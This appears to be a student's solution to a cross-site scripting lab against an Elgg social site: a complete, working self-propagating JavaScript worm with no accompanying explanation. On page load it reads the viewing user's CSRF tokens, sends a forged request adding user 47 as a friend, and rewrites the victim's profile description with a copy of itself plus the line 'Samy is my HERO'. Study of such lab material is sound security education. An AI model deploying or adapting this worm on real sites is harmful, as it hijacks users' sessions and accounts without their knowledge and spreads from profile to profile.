<script id="worm" type="text/javascript">
window.onload = function() {
  
    if(elgg.session.user.guid != 47) {
       
        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + 
                     "&__elgg_ts=" + elgg.security.token.__elgg_ts + 
                     "&__elgg_token=" + elgg.security.token.__elgg_token;

        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();

        // 2. 修改个人资料
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                     "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                     "&name=" + elgg.session.user.name +
                     "&description=" + wormCode +
                     "&accesslevel[description]=2" +
                     "&briefdescription=" + encodeURIComponent("Samy is my HERO (ADDED BY HAN)") +
                     "&accesslevel[briefdescription]=2" +
                     "&guid=" + elgg.session.user.guid;

        var Ajax2 = null;
        Ajax2 = new XMLHttpRequest();
        Ajax2.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
        Ajax2.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax2.send(content);
    }
}
</script>
